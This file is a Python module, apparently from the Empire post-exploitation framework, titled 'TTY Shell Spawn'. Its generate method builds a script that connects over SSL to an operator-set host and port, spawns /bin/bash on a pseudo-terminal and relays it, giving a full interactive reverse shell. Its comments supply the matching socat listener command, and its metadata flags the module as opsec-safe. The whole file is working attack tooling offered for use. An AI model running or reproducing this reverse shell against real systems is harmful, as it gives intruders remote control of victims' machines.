class Module:

    def __init__(self, mainMenu, params=[]):

        # metadata info about the module, not modified during runtime
        self.info = {
            # name for the module that will appear in module menus
            'Name': 'TTY Shell Spawn',

            # list of one or more authors for the module
            'Author': ['calmhavoc'],

            # more verbose multi-line description of the module
            'Description': ('Spawns a reverse shell with TTY support over HTTPS'),

            # True if the module needs to run in the background
            'Background' : True,

            # File extension to save the file as
            'OutputExtension' : '',

            # if the module needs administrative privileges
            'NeedsAdmin' : False,

            # True if the method doesn't touch disk/is reasonably opsec safe
            'OpsecSafe' : True,

            # the module language
            'Language' : 'python',

            # the minimum language version needed
            'MinLanguageVersion' : '2.6',

            # list of any references/other comments
            'Comments': ['Listen with: socat `tty`,raw,echo=0 openssl-listen:443,reuseaddr,cert=cert.pem,verify=0' ]
        }

        # any options needed by the module, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Agent' : {
                # The 'Agent' option is the only one that MUST be in a module
                'Description'   :   'Agent to execute module on.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'Host' : {
                'Description'   :   'Listening HTTPS Host; eg host running: socat `tty`,raw,echo=0 openssl-listen:443,reuseaddr,cert=cert.pem,verify=0',
                'Required'      :   True,
                'Value'         :   ''
            },
            'Port' : {
                'Description'   :   'Target port , 443 is default.',
                'Required'      :   True,
                'Value'         :   '443'
            }
                    }

        self.mainMenu = mainMenu

        if params:
            for param in params:
                option, value = param
                if option in self.options:
                    self.options[option]['Value'] = value

    def generate(self, obfuscate=False, obfuscationCommand=""):
        host = self.options['Host']['Value']
        port = self.options['Port']['Value']

        script = """
import socket,sys,subprocess,os
import pty
import ssl
import select


def main(host,port):
    ADDRESS = (host, int(port))
    sslSock = ssl.wrap_socket(socket.socket(socket.AF_INET, socket.SOCK_STREAM), ssl_version=ssl.PROTOCOL_SSLv23)
    sslSock.connect(ADDRESS)
    master, slave = pty.openpty()
    myterm = subprocess.Popen(["/bin/bash"],preexec_fn=os.setsid,stdin=slave, stdout=slave, stderr=slave,
                            universal_newlines=True)

    try:
        while myterm.poll() is None:  
            rlist, wlist, xlist = select.select([sslSock, master], [], [])  
            if sslSock in rlist:
                try:
                    data = sslSock.recv(1024)
                except Exception as e:
                    print str(e)
                if not data:break
                while sslSock.pending():
                    data += sslSock.recv(sslSock.pending())
                os.write(master, data)
            elif master in rlist:  
                sslSock.write(os.read(master, 1024))
    finally:
        sslSock.close()

main("%s","%s")
""" % (host,port)
        return script
